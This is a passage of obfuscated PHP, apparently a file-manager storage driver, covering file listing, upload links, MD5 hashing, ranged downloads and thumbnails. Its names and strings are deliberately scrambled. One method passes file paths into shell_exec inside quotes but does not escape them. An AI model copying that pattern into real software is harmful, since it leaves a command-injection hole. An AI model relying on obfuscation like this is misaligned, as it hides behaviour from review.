(is_array($ë§œ¸ç[$’Û×ÒÍñ[90]])) { $ºÓóü¬¡[$’Û×ÒÍñ[89]] = $ë§œ¸ç[$’Û×ÒÍñ[90]][$’Û×ÒÍñ[87]]; $ºÓóü¬¡[$’Û×ÒÍñ[79]] = $ë§œ¸ç[$’Û×ÒÍñ[90]][$’Û×ÒÍñ[79]]; $ºÓóü¬¡[$’Û×ÒÍñ[88]] = $ë§œ¸ç[$’Û×ÒÍñ[90]][$’Û×ÒÍñ[88]]; } else { if (substr($ë§œ¸ç[$’Û×ÒÍñ[87]], 0, strlen($Õ„‘‹«¿)) == $Õ„‘‹«¿) { $ºÓóü¬¡[$’Û×ÒÍñ[87]] = substr($ë§œ¸ç[$’Û×ÒÍñ[87]], strlen($Õ„‘‹«¿)); } } $è“‹£“ë = $ë§œ¸ç[$’Û×ÒÍñ[78]] ? $’Û×ÒÍñ[8] : $’Û×ÒÍñ[12]; $ºÓóü¬¡[$’Û×ÒÍñ[89]] = rtrim($ºÓóü¬¡[$’Û×ÒÍñ[89]], $’Û×ÒÍñ[8]) . $è“‹£“ë; $ºÓóü¬¡[$’Û×ÒÍñ[87]] = $’Û×ÒÍñ[8] . trim($ºÓóü¬¡[$’Û×ÒÍñ[87]], $’Û×ÒÍñ[8]) . $è“‹£“ë; if (!$ÄÈœÙ‹) { $íáßÉÅ = explode($’Û×ÒÍñ[8], trim($ºÓóü¬¡[$’Û×ÒÍñ[87]], $’Û×ÒÍñ[8])); $ºÓóü¬¡[$’Û×ÒÍñ[87]] = $’Û×ÒÍñ[8] . implode($’Û×ÒÍñ[8], array_slice($íáßÉÅ, 1)) . $è“‹£“ë; } $¡Ù¯—•†[] = $ºÓóü¬¡; } return array_sort_by($¡Ù¯—•†, $’Û×ÒÍñ[87]); } public function upload($«ÛóÁ¯ê, $×õªãùÜ, $½ô§€‡ì = false, $¯‡Ê£Š‡ = REPEAT_REPLACE) { } public function uploadFileByID($¬ÕœŸô, $Üï½ë‡›, $åòÇÁ‹) { } public function uploadFileByPath($µ­ÂÏËÃ, $–ş¾‚Óæ, $Ò¸ïâ–Š = array()) { } public function isUploadServer() { $ƒ§ÙÏ¶È =& $_SERVER[Ş­ğŠìÒ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ƒ§ÙÏ¶È[91]) { return !0; } return $GLOBALS[$ƒ§ÙÏ¶È[6]][$ƒ§ÙÏ¶È[92]][$ƒ§ÙÏ¶È[93]]; } public function isFileOutServer() { $¶±ùÑÆ“ =& $_SERVER[Ş­ğŠìÒ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¶±ùÑÆ“[91]) { return !0; } return $GLOBALS[$¶±ùÑÆ“[6]][$¶±ùÑÆ“[92]][$¶±ùÑÆ“[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($•Š®ü´) { $ô¿Ñò‹Æ =& $_SERVER[Ş­ğŠìÒ]; if (!$this->isCdnHost()) { return $•Š®ü´; } return str_replace(trim(get_url_root($•Š®ü´), $ô¿Ñò‹Æ[8]), trim($this->cdnHost, $ô¿Ñò‹Æ[8]), $•Š®ü´); } public function uploadLink($ËñéÌ²®, $Â«¯±“ø = 0) { $Ê¡İØÖ… =& $_SERVER[Ş­ğŠìÒ]; if ($this->isUploadServer()) { return; } $ÆàŸâé¤ = $this->getType(); if (!in_array($ÆàŸâé¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $—šŸ«—  = 1024 * 1024 * 10; $Í¨›¨¸á = $Â«¯±“ø <= $—šŸ«—  ? $Ê¡İØÖ…[95] : $Ê¡İØÖ…[96]; $âîã¸—© = (!$Â«¯±“ø ? 1 : ceil($Â«¯±“ø / pow(1024, 3))) * 3600 * 4; $À¢Üáªù = $this->{$Í¨›¨¸á}($ËñéÌ²®, $âîã¸—©); if ($À¢Üáªù) { $À¢Üáªù[$Ê¡İØÖ…[97]] = $ËñéÌ²®; $À¢Üáªù[$Ê¡İØÖ…[98]] = $ÆàŸâé¤; } return $À¢Üáªù; } public function uploadFormData($ŠÙ»Ç¯Í, $°‹ÑÎä« = 3600) { } public function multiUploadFormData($’ıÊ¬ëì, $’¶…ê€÷ = 3600) { } public function download($›â•İÌƒ, $ÓÇçÀ¦) { } public function ext($Ş¶ÁÁñ–) { $Œ§Éú­½ =& $_SERVER[Ş­ğŠìÒ]; if (strpos($Ş¶ÁÁñ–, $Œ§Éú­½[8]) === -1) { $ŸúßÙ‚ = $Ş¶ÁÁñ–; } else { $ŸúßÙ‚ = $this->pathThis($Ş¶ÁÁñ–); } $€˜ÓµÆó = $Œ§Éú­½[12]; if (strstr($ŸúßÙ‚, $Œ§Éú­½[10])) { $€˜ÓµÆó = substr($ŸúßÙ‚, strrpos($ŸúßÙ‚, $Œ§Éú­½[10]) + 1); $€˜ÓµÆó = strtolower($€˜ÓµÆó); } if (strlen($€˜ÓµÆó) > 3 && preg_match($Œ§Éú­½[99], $€˜ÓµÆó, $ˆµÄÈè)) { $€˜ÓµÆó = $Œ§Éú­½[12]; } return $€˜ÓµÆó; } public function pathThis($€ÓÈ²ÎÉ) { $ÔÖÉ±½´ =& $_SERVER[Ş­ğŠìÒ]; $€ÓÈ²ÎÉ = str_replace($ÔÖÉ±½´[100], $ÔÖÉ±½´[8], rtrim($€ÓÈ²ÎÉ, $ÔÖÉ±½´[8])); $¿òÏ‰°ò = strrpos($€ÓÈ²ÎÉ, $ÔÖÉ±½´[8]); if ($¿òÏ‰°ò === !1) { return $€ÓÈ²ÎÉ; } return substr($€ÓÈ²ÎÉ, $¿òÏ‰°ò + 1); } public function pathFather($Èû“ÛÛç) { $¿¸¶– =& $_SERVER[Ş­ğŠìÒ]; $Èû“ÛÛç = str_replace($¿¸¶–[100], $¿¸¶–[8], rtrim($Èû“ÛÛç, $¿¸¶–[8])); $úİÊŒÔ = strrpos($Èû“ÛÛç, $¿¸¶–[8]); if ($úİÊŒÔ === !1) { return $¿¸¶–[12]; } return substr($Èû“ÛÛç, 0, $úİÊŒÔ + 1); } public function hashSimple($¿ìÕ—ğ­) { $ÀÁ½‹Ù =& $_SERVER[Ş­ğŠìÒ]; if (!$¿ìÕ—ğ­) { return md5($ÀÁ½‹Ù[12]); } $òÖÚ‡¶† = $this->size($¿ìÕ—ğ­); $è¢óÆ = 200; $µŠëÂ˜Ö = 50; if ($òÖÚ‡¶† <= $è¢óÆ * $µŠëÂ˜Ö) { return $this->hashMd5($¿ìÕ—ğ­) . $òÖÚ‡¶†; } $Ù³›šõ¢ = intval($òÖÚ‡¶† / $µŠëÂ˜Ö); $Æ”ğˆèä = $ÀÁ½‹Ù[12]; for ($»ôæìÔ÷ = 0; $»ôæìÔ÷ < $µŠëÂ˜Ö; $»ôæìÔ÷++) { $Æ”ğˆèä .= $this->fileSubstr($¿ìÕ—ğ­, $Ù³›šõ¢ * $»ôæìÔ÷, $è¢óÆ); } $Æ”ğˆèä .= $this->fileSubstr($¿ìÕ—ğ­, $òÖÚ‡¶† - $è¢óÆ, $è¢óÆ); return md5($Æ”ğˆèä) . $òÖÚ‡¶†; } public static $md5Cache = array(); public function hashMd5($Ş¯ÔÇÂ) { if (!$Ş¯ÔÇÂ) { return md5($_SERVER[Ş­ğŠìÒ][12]); } $Ş¯ÔÇÂ = $this->iconvSystem($Ş¯ÔÇÂ); if (isset(self::$md5Cache[$Ş¯ÔÇÂ])) { return self::$md5Cache[$Ş¯ÔÇÂ]; } self::$md5Cache[$Ş¯ÔÇÂ] = $this->hashMd5Shell($Ş¯ÔÇÂ); if (!self::$md5Cache[$Ş¯ÔÇÂ]) { self::$md5Cache[$Ş¯ÔÇÂ] = @md5_file($Ş¯ÔÇÂ); } return self::$md5Cache[$Ş¯ÔÇÂ]; } private function hashMd5Shell($’à»ş ‹) { $Å²ÊÚà’ =& $_SERVER[Ş­ğŠìÒ]; if (!$’à»ş ‹) { return md5($Å²ÊÚà’[12]); } if (!function_exists($Å²ÊÚà’[101])) { return !1; } $ñåÄÜ„ô = array($Å²ÊÚà’[102], $Å²ÊÚà’[103]); $¹Æ€¬ƒÑ = Cache::get($Å²ÊÚà’[104]); if (!$¹Æ€¬ƒÑ) { $ÑÊªÙóû = BASIC_PATH . $Å²ÊÚà’[105]; $èæõ¹›û = md5_file($ÑÊªÙóû); $¹Æ€¬ƒÑ = $Å²ÊÚà’[106]; foreach ($ñåÄÜ„ô as $¢Ş§¶–”) { $Øç°‰Àö = shell_exec($¢Ş§¶–” . "\x20\42{$ÑÊªÙóû}\x22"); if ($Øç°‰Àö && substr(trim($Øç°‰Àö), 0, 32) == $èæõ¹›û) { $¹Æ€¬ƒÑ = $¢Ş§¶–”; break; } } Cache::set($Å²ÊÚà’[104], $¹Æ€¬ƒÑ, 3600); } if ($¹Æ€¬ƒÑ == $Å²ÊÚà’[106]) { return !1; } $Øç°‰Àö = shell_exec($¹Æ€¬ƒÑ . "\40\x22{$’à»ş ‹}\x22"); $Øç°‰Àö = str_replace($Å²ÊÚà’[107], $Å²ÊÚà’[12], $Øç°‰Àö); return substr($Øç°‰Àö, 0, 32); } public function link($•åÆùÚİ) { return $•åÆùÚİ; } public function fileOut($öŒ’œÂ¢, $•¤åƒ¾× = false, $ï¼á’Å§ = false, $Ïë©Åœç = '') { $ÈšÍ šå =& $_SERVER[Ş­ğŠìÒ]; $this->cacheMethod(null, null); if (!$öŒ’œÂ¢ || !$this->exist($öŒ’œÂ¢)) { show_json(LNG($ÈšÍ šå[108]), !1, $ï¼á’Å§); } $ÁÌÂÎŞ = $this->getType() == $ÈšÍ šå[109]; $ë¥®¯õ = $GLOBALS[$ÈšÍ šå[6]][$ÈšÍ šå[92]][$ÈšÍ šå[110]][$ÈšÍ šå[111]]; $¶ıïÓ“Ë = (double) $GLOBALS[$ÈšÍ šå[6]][$ÈšÍ šå[92]][$ÈšÍ šå[110]][$ÈšÍ šå[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $“´÷¢µ¿ = $this->infoFull($öŒ’œÂ¢); $¬ü×ûû¾ = $“´÷¢µ¿[$ÈšÍ šå[79]]; $§Ê…ì›™ = gmdate($ÈšÍ šå[113], $“´÷¢µ¿[$ÈšÍ šå[88]]); $ëÏé“»Ü = $ï¼á’Å§ ? $ï¼á’Å§ : $this->iconvApp($“´÷¢µ¿[$ÈšÍ šå[32]]); $ÓÅßú—Ÿ = 0; $í¥à†“¤ = $¬ü×ûû¾ - 1; $ÛÍ˜à±é = $this->ext($ëÏé“»Ü); if (in_array($ÛÍ˜à±é, array($ÈšÍ šå[114], $ÈšÍ šå[115], $ÈšÍ šå[116], $ÈšÍ šå[117]))) { $ÛÍ˜à±é = $ÈšÍ šå[118]; } if (in_array($ÛÍ˜à±é, array($ÈšÍ šå[119]))) { $ÛÍ˜à±é = $ÈšÍ šå[120]; } if (!$Ïë©Åœç) { $Ïë©Åœç = md5($§Ê…ì›™ . $¬ü×ûû¾); } $Ïë©Åœç = $ÈšÍ šå[121] . $Ïë©Åœç . $ÈšÍ šå[121]; $…şáÚ = get_file_mime($ÛÍ˜à±é); $Á±®’Ş¾ = !0; $Á±®’Ş¾ = isset($_GET[$ÈšÍ šå[122]]) ? !1 : !0; if ($•¤åƒ¾× === !1 && !mime_support($…şáÚ)) { $…şáÚ = $ÈšÍ šå[123]; } header($ÈšÍ šå[124]); header($ÈšÍ šå[125] . $…şáÚ); $öÍ¤àó„ = rawurlencode($ëÏé“»Ü); $öÍ¤àó„ = $ÈšÍ šå[121] . $öÍ¤àó„ . $ÈšÍ šå[126] . $öÍ¤àó„; if ($•¤åƒ¾×) { header($ÈšÍ šå[127]); header($ÈšÍ šå[128] . $öÍ¤àó„); } else { if ($Á±®’Ş¾) { header($ÈšÍ šå[129] . $öÍ¤àó„); } } $¿ôÔ”æ¥ = 3600 * 24 * 30; header($ÈšÍ šå[130]); header($ÈšÍ šå[131]); header($ÈšÍ šå[132] . $¿ôÔ”æ¥); header($ÈšÍ šå[133] . gmdate($ÈšÍ šå[113], time() + $¿ôÔ”æ¥) . $ÈšÍ šå[134]); if (isset($_SERVER[$ÈšÍ šå[135]]) && strtotime($_SERVER[$ÈšÍ šå[135]]) == $“´÷¢µ¿[$ÈšÍ šå[88]]) { header($ÈšÍ šå[136], !0, 304); die; } if (isset($_SERVER[$ÈšÍ šå[137]]) && $_SERVER[$ÈšÍ šå[137]] == $Ïë©Åœç) { header($ÈšÍ šå[138] . $Ïë©Åœç, !0, 304); die; } header($ÈšÍ šå[138] . $Ïë©Åœç); header($ÈšÍ šå[139] . $§Ê…ì›™ . $ÈšÍ šå[134]); header($ÈšÍ šå[140] . $ëÏé“»Ü); header($ÈšÍ šå[141]); header($ÈšÍ šå[142] . $¬ü×ûû¾); header($ÈšÍ šå[143]); Hook::trigger($ÈšÍ šå[144], $öŒ’œÂ¢, $¬ü×ûû¾, $ëÏé“»Ü, $ÛÍ˜à±é); if (!$•¤åƒ¾× && $ÛÍ˜à±é == $ÈšÍ šå[145]) { if ($¬ü×ûû¾ > 1024 * 1024 * 5) { die; } $û«Ïæ˜ = $this->getContent($öŒ’œÂ¢); $û«Ïæ˜ = Html::clearSVG($û«Ïæ˜); header($ÈšÍ šå[146] . strlen($û«Ïæ˜)); echo $û«Ïæ˜; die; } $Ş¹ğ°î = strtolower($_SERVER[$ÈšÍ šå[147]]); if ($ÁÌÂÎŞ && $Ş¹ğ°î && $ë¥®¯õ) { if (strstr($Ş¹ğ°î, $ÈšÍ šå[148])) { header($ÈšÍ šå[149] . $öŒ’œÂ¢); } else { if (strstr($Ş¹ğ°î, $ÈšÍ šå[150])) { header($ÈšÍ šå[151] . $öŒ’œÂ¢); } else { if (strstr($Ş¹ğ°î, $ÈšÍ šå[152])) { header($ÈšÍ šå[153] . $öŒ’œÂ¢); } } } if ($¶ıïÓ“Ë) { header($ÈšÍ šå[154] . $¶ıïÓ“Ë); } return; } if (isset($_SERVER[$ÈšÍ šå[155]])) { if (preg_match($ÈšÍ šå[156], $_SERVER[$ÈšÍ šå[155]], $‰Ã©·Ä‰)) { $ÓÅßú—Ÿ = intval($‰Ã©·Ä‰[1]); $ÓÅßú—Ÿ = $ÓÅßú—Ÿ <= 0 ? 0 : ($ÓÅßú—Ÿ >= $í¥à†“¤ ? $í¥à†“¤ : $ÓÅßú—Ÿ); if (!empty($‰Ã©·Ä‰[2])) { $†£û€öÃ = intval($‰Ã©·Ä‰[2]); $í¥à†“¤ = $†£û€öÃ < $ÓÅßú—Ÿ ? $ÓÅßú—Ÿ : ($†£û€öÃ >= $í¥à†“¤ ? $í¥à†“¤ : $†£û€öÃ); } } header($ÈšÍ šå[157]); header("\103\x6f\156\164\145\x6e\164\x2d\x52\x61\156\x67\145\72\40\x62\x79\164\x65\163\40{$ÓÅßú—Ÿ}\x2d{$í¥à†“¤}\57" . $¬ü×ûû¾); } else { header($ÈšÍ šå[158]); } header($ÈšÍ šå[159]); header($ÈšÍ šå[160]); $¶Ÿˆ¥© = !0; if ($_SERVER[$ÈšÍ šå[161]] == $ÈšÍ šå[162] && $¬ü×ûû¾ > 1204 * 1024 * 1024 * 2) { $¶Ÿˆ¥© = !1; } if ($¶Ÿˆ¥©) { header($ÈšÍ šå[163] . ($í¥à†“¤ - $ÓÅßú—Ÿ + 1)); } if ($_SERVER[$ÈšÍ šå[164]] == $ÈšÍ šå[165]) { return; } $çÍÎÛ± = array($ÈšÍ šå[166] => !1, $ÈšÍ šå[167] => $ÓÅßú—Ÿ, $ÈšÍ šå[168] => $í¥à†“¤, $ÈšÍ šå[169] => $ÛÍ˜à±é, $ÈšÍ šå[170] => $“´÷¢µ¿, $ÈšÍ šå[171] => $ÈšÍ šå[12], $ÈšÍ šå[172] => 0); $çÍÎÛ± = Hook::filter($ÈšÍ šå[173], $çÍÎÛ±); $ñƒ›úç€ = 1024 * 300; $Í ‰Â¶ = 0; if ($¶ıïÓ“Ë) { $Í ‰Â¶ = intval(1000 * 1000 * ($ñƒ›úç€ / $¶ıïÓ“Ë)); } while ($ÓÅßú—Ÿ <= $í¥à†“¤) { $ñîÈéŸ’ = timeFloat(); check_abort(); $Ø¯„§ø¯ = $í¥à†“¤ - $ÓÅßú—Ÿ + 1; if ($Ø¯„§ø¯ <= $ñƒ›úç€) { $ñƒ›úç€ = $Ø¯„§ø¯; } $û«Ïæ˜ = $this->fileSubstr($öŒ’œÂ¢, $ÓÅßú—Ÿ, $ñƒ›úç€); if ($çÍÎÛ±[$ÈšÍ šå[166]]) { $çÍÎÛ±[$ÈšÍ šå[171]] = $û«Ïæ˜; $çÍÎÛ±[$ÈšÍ šå[172]] = $ÓÅßú—Ÿ; $çÍÎÛ± = Hook::filter($ÈšÍ šå[174], $çÍÎÛ±); $û«Ïæ˜ = $çÍÎÛ±[$ÈšÍ šå[171]]; } echo $û«Ïæ˜; $ÓÅßú—Ÿ += $ñƒ›úç€; if ($ñƒ›úç€ == $Ø¯„§ø¯) { $ÓÅßú—Ÿ = $í¥à†“¤ + 1; } if ($Í ‰Â¶) { $ğ‡¯¥õó = intval(1000 * 1000 * (timeFloat() - $ñîÈéŸ’)); $Ôé‡™² = $Í ‰Â¶ - $ğ‡¯¥õó; if ($Ôé‡™² > 5) { usleep($Ôé‡™²); } } } } public function fileOutServer($¢áÃĞŸé, $Ö·ıŠà = false, $’°ö‡ü = false, $œñ¶ğÊ¦ = '') { $this->fileOut($¢áÃĞŸé, $Ö·ıŠà, $’°ö‡ü, $œñ¶ğÊ¦); } public function fileOutLink($ÊÍóí˜) { header($_SERVER[Ş­ğŠìÒ][175] . $ÊÍóí˜); die; } public function cacheMethod($€›¦ª½õ, $ıİ¬š¶Î, $ÔúôØÉ = null) { $‘’‹µ¶ =& $_SERVER[Ş­ğŠìÒ]; static $üÔ»Œ¸ = array(); $ĞÃŒØ¿Ì = $ıİ¬š¶Î ? ltrim($this->getPathOuter($ıİ¬š¶Î), $‘’‹µ¶[8]) : $‘’‹µ¶[12]; $ÆÓßÚ– = $‘’‹µ¶[176] . $€›¦ª½õ . $‘’‹µ¶[177] . rtrim($ĞÃŒØ¿Ì, $‘’‹µ¶[8]); if (is_null($€›¦ª½õ)) { $üÔ»Œ¸ = array(); return; } if (is_null($ıİ¬š¶Î)) { foreach ($üÔ»Œ¸ as $ÆÓßÚ– => $Èèî£©¾) { if (!strstr($ÆÓßÚ–, $‘’‹µ¶[176] . $€›¦ª½õ . $‘’‹µ¶[178])) { continue; } unset($üÔ»Œ¸[$ÆÓßÚ–]); } return; } if (!is_null($ÔúôØÉ)) { $üÔ»Œ¸[$ÆÓßÚ–] = $ÔúôØÉ; return; } $Ó²¸üìä = isset($üÔ»Œ¸[$ÆÓßÚ–]) ? $üÔ»Œ¸[$ÆÓßÚ–] : null; if (!is_null($Ó²¸üìä)) { return $Ó²¸üìä; } $Ó²¸üìä = $this->{$€›¦ª½õ}($ıİ¬š¶Î); $üÔ»Œ¸[$ÆÓßÚ–] = $Ó²¸üìä; return $Ó²¸üìä; } public function cacheMethodInfoSet($¼æ‡Ô˜Ş, $†¸Ãªö, $â¦ËÇÍë = false) { $©¨ùø¦² =& $_SERVER[Ş­ğŠìÒ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($©¨ùø¦²[179], $¼æ‡Ô˜Ş, $†¸Ãªö); $this->cacheMethod($©¨ùø¦²[180], $¼æ‡Ô˜Ş, $†¸Ãªö ? !1 : !0); if (is_array($â¦ËÇÍë)) { $this->cacheMethod($©¨ùø¦²[181], $¼æ‡Ô˜Ş, $â¦ËÇÍë); } } public function fileOutImage($˜¼ˆ¬‰, $¨¾Ö¨Æ¹ = 250) { $¼Ì”ºÌÑ =& $_SERVER[Ş­ğŠìÒ]; set_timeout(); if (substr($˜¼ˆ¬‰, 0, 4) == $¼Ì”ºÌÑ[152]) { $this->fileOutLink($˜¼ˆ¬‰); } $ŸÅ—˜îà = $this->info($˜¼ˆ¬‰); $•öŸü˜² = !1; $é‹ûÇœ = isset($GLOBALS[$¼Ì”ºÌÑ[182]]) ? $GLOBALS[$¼Ì”ºÌÑ[182]] : array(); if ($é‹ûÇœ && $é‹ûÇœ[$¼Ì”ºÌÑ[183]] == $ŸÅ—˜îà[$¼Ì”ºÌÑ[87]]) { $ŸÅ—˜îà = $é‹ûÇœ; $Ï€ÉÕäÂ = $ŸÅ—˜îà[$¼Ì”ºÌÑ[184]]; if ($Ï€ÉÕäÂ && isset($Ï€ÉÕäÂ[$¼Ì”ºÌÑ[185]])) { if ($Ï€ÉÕäÂ[$¼Ì”ºÌÑ[185]] <= $¨¾Ö¨Æ¹ && $Ï€ÉÕäÂ[$¼Ì”ºÌÑ[186]] <= $¨¾Ö¨Æ¹) { $•öŸü˜² = !0; } } } if ($ŸÅ—˜îà[$¼Ì”ºÌÑ[79]] <= 1024 * 50 || $•öŸü˜² || !function_exists($¼Ì”ºÌÑ[187]) || $ŸÅ—˜îà[$¼Ì”ºÌÑ[169]] == $¼Ì”ºÌÑ[188]) { return $this->fileOut($˜¼ˆ¬‰, !1, $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); } $°ä™çÏº = kodIO::hashPath($ŸÅ—˜îà); $É£Ê£éß = "\x63\x6f\166\x65\x72\137{$°ä™çÏº}\x5f{$¨¾Ö¨Æ¹}\x2e\160\156\x67"; $õÎ‰Ùàˆ = IO_PATH_SYSTEM_TEMP . $¼Ì”ºÌÑ[189]; $Ì£â¿Ú = IO::infoFullSimple($õÎ‰Ùàˆ); $õË¹®‹Û = $Ì£â¿Ú && is_array($Ì£â¿Ú) ? $Ì£â¿Ú[$¼Ì”ºÌÑ[87]] : $¼Ì”ºÌÑ[12]; if (!$õË¹®‹Û) { $õË¹®‹Û = IO::mkdir($õÎ‰Ùàˆ); } if ($ŸÅ—˜îà[$¼Ì”ºÌÑ[190]] == $¼Ì”ºÌÑ[191] && isset($ŸÅ—˜îà[$¼Ì”ºÌÑ[192]]) && $ŸÅ—˜îà[$¼Ì”ºÌÑ[192]] == kodIO::sourceID($õË¹®‹Û)) { $²Š‡Åõò = $ŸÅ—˜îà[$¼Ì”ºÌÑ[193]]; if ($¨¾Ö¨Æ¹ <= 500) { $§ôí“¨÷ = preg_replace($¼Ì”ºÌÑ[194], $¼Ì”ºÌÑ[195], $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); $²Š‡Åõò = IO::fileNameExist($õË¹®‹Û, $§ôí“¨÷); } return IO::fileOut(KodIO::make($²Š‡Åõò), !1, $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); } $¹çºƒ™ = IO::fileNameExist($õË¹®‹Û, $É£Ê£éß); if ($¹çºƒ™) { return IO::fileOut(KodIO::make($¹çºƒ™), !1, $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); } if ($¨¾Ö¨Æ¹ > 1000) { $this->makeImageCover($õË¹®‹Û, $˜¼ˆ¬‰, $É£Ê£éß, $¨¾Ö¨Æ¹); $this->makeImageCover($õË¹®‹Û, $˜¼ˆ¬‰, "\143\x6f\166\145\162\137{$°ä™çÏº}\x5f\62\x35\60\x2e\160\x6e\147", 250); $¹çºƒ™ = IO::fileNameExist($õË¹®‹Û, $É£Ê£éß); if ($¹çºƒ™) { return IO::fileOut(KodIO::make($¹çºƒ™), !1, $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); } die; } if (!kodIO::allowCover($ŸÅ—˜îà)) { return $this->fileOut($˜¼ˆ¬‰, !1, $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]]); } $Ú«íÓÍ„ = Cache::get($É£Ê£éß); if ($Ú«íÓÍ„ == $¼Ì”ºÌÑ[196] || $Ú«íÓÍ„ == $¼Ì”ºÌÑ[197]) { echo $Ú«íÓÍ„; die; } Cache::set($É£Ê£éß, $¼Ì”ºÌÑ[197], 60); $’ò¡Ê¨Ö = array($õË¹®‹Û, $ŸÅ—˜îà[$¼Ì”ºÌÑ[87]], $É£Ê£éß, $¨¾Ö¨Æ¹); $äõŠ‹’¾ = $¼Ì”ºÌÑ[198] . $ŸÅ—˜îà[$¼Ì”ºÌÑ[79]] . $¼Ì”ºÌÑ[199] . $É£Ê£éß . $¼Ì”ºÌÑ[200] . $ŸÅ—˜îà[$¼Ì”ºÌÑ[32]] . $¼Ì”ºÌÑ[201] . $ŸÅ—˜îà[$¼Ì”ºÌÑ[87]]; TaskQueue::add($¼Ì”ºÌÑ[202], $’ò¡Ê¨Ö, $äõŠ‹’¾, $É£Ê£éß); } public function makeImageCover($±ñº‘˜ø, $ä¦¥¡¼×, $Ùóªú·Ø, $…Õüµ£) { $ÜœĞÓ¸ =& $_SERVER[Ş­ğŠìÒ]; if (IO::fileNameExist($±ñº‘˜ø, $Ùóªú·Ø)) { return $ÜœĞÓ¸[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ñóÎ ³Š = DATA_THUMB . $Ùóªú·Ø; del_file($ñóÎ ³Š); $æãØÕ¡® = IO::copy($ä¦¥¡¼×, TEMP_FILES, !1, $Ùóªú·Ø); if (!@file_exists($æãØÕ¡®)) { return $ÜœĞÓ¸[204]; } ImageThumb::createThumb($æãØÕ¡®, $ñóÎ ³Š, $…Õüµ£, $…Õüµ£ * 10); if (@file_exists($ñóÎ ³Š)) { Cache::remove($Ùóªú·Ø); return IO::move($ñóÎ ³Š, $±ñº‘˜ø); } Cache::set($Ùóªú·Ø, $ÜœĞÓ¸[196], 600); del_file($ñóÎ ³Š); return $ÜœĞÓ¸[205] . $æãØÕ¡® . $ÜœĞÓ¸[74]; } public function fileOutImageServer($—êˆ¿¨‰, $Ãú¤ÛÎ = 250) { $this->fileOutImage($—êˆ¿¨‰, $Ãú¤ÛÎ); } public function fileNameAuto($Ì¯Âœğû, $ƒü½óÄÙ, $¡š²¼½³ = REPEAT_RENAME, $Ğï…ïÏé = false) { $Éôß® =& $_SERVER[Ş­ğŠìÒ]; $áÒ½á´ü = $Ì¯Âœğû === $Éôß®[12] ? $ƒü½óÄÙ : rtrim($Ì¯Âœğû, $Éôß®[8]) . $Éôß®[8] . $ƒü½óÄÙ; if ($¡š²¼½³ == REPEAT_REPLACE || !$this->exist($áÒ½á´ü) || $Ğï…ïÏé && $¡š²¼½³ != REPEAT_RENAME_FOLDER) { return $ƒü½óÄÙ; } if ($¡š²¼½³ == REPEAT_SKIP) { return !1; } $‰ó‹ïİ¸ = $Éôß®[10] . get_path_ext($ƒü½óÄÙ); $‰ó‹ïİ¸ = $‰ó‹ïİ¸ == $Éôß®[10] || $Ğï…ïÏé ? $Éôß®[12] : $‰ó‹ïİ¸; $ğ„ĞÄ¦² = 1; $»´”íĞ = substr($ƒü½óÄÙ, 0, strlen($ƒü½óÄÙ) - strlen($‰ó‹ïİ¸)); $¯±°Êƒ = $»´”íĞ . "\x28{$ğ„ĞÄ¦²}\x29{$‰ó‹ïİ¸}"; while ($this->exist(rtrim($Ì¯Âœğû, $Éôß®[8]) . $Éôß®[8] . $¯±°Êƒ)) { $¯±°Êƒ = $»´”íĞ . "\50{$ğ„ĞÄ¦²}\51{$‰ó‹ïİ¸}"; $ğ„ĞÄ¦²++; } return $¯±°Êƒ; } private function fileNameAutoList($ğƒ–”şò, $ÃÜ®¸­í, $™ıœú­ã = false) { $±ĞÀÒÇÂ =& $_SERVER[Ş­ğŠìÒ]; $äš×ÀŸ = $this->listPath($ğƒ–”şò, !0); $äš×ÀŸ = array_merge($äš×ÀŸ[$±ĞÀÒÇÂ[85]], $äš×ÀŸ[$±ĞÀÒÇÂ[86]]); $ªéÔ¯ = array_to_keyvalue($äš×ÀŸ, $±ĞÀÒÇÂ[12], $±ĞÀÒÇÂ[32]); $×÷Åãó’ = $±ĞÀÒÇÂ[10] . get_path_ext($ÃÜ®¸­í); $×÷Åãó’ = $×÷Åãó’ == $±ĞÀÒÇÂ[10] || $™ıœú­ã ? $±ĞÀÒÇÂ[12] : $×÷Åãó’; $ğ¡Õ†‰“ = substr($ÃÜ®¸­í, 0, strlen($ÃÜ®¸­í) - strlen($×÷Åãó’)); $¯¤ô´©± = $ğ¡Õ†‰“ . "\x28\x30\51{$×÷Åãó’}"; for ($¦ÙÅŒø„ = 1; $¦ÙÅŒø„ <= count($ªéÔ¯) + 1; $¦ÙÅŒø„++) { $¯¤ô´©± = $ğ¡Õ†‰“ . "\50{$¦ÙÅŒø„}\x29{$×÷Åãó’}"; if (!in_array_not_case($¯¤ô´©±, $ªéÔ¯)) { return $¯¤ô´©±; } } return $¯¤ô´©±; } public function listAllFiles($Şâ½İ‡ò, $µÎ©ÉüÛ) { $ú‹¨íˆ› =& $_SERVER[Ş­ğŠìÒ]; if (empty($µÎ©ÉüÛ)) { return array(); } $Ú§ˆ•Äº = array_keys($µÎ©ÉüÛ); $ÚÏ¬‡“ = array(); $Şâ½İ‡ò = trim($Şâ½İ‡ò, $ú‹¨íˆ›[8]); foreach ($µÎ©ÉüÛ as $É¬ì¾° => $Âêñ¥ú™) { $Äµ£¼ÓË = ltrim(substr(trim($É¬ì¾°, $ú‹¨íˆ›[8]), strlen($Şâ½İ‡ò)), $ú‹¨íˆ›[8]); if (substr($É¬ì¾°, -1) == $ú‹¨íˆ›[8]) { $Äµ£¼ÓË = rtrim($Äµ£¼ÓË, $ú‹¨íˆ›[8]) . $ú‹¨íˆ›[8]; } $ÚÏ¬‡“ = array_merge($ÚÏ¬‡“, $this->slicePath($Äµ£¼ÓË)); } $©â²ÙŠ” = array(); foreach (array_unique($ÚÏ¬‡“) as $®’İªğ¯) { $Ö¤ÌÁİ³ = array($ú‹¨íˆ›[87] => 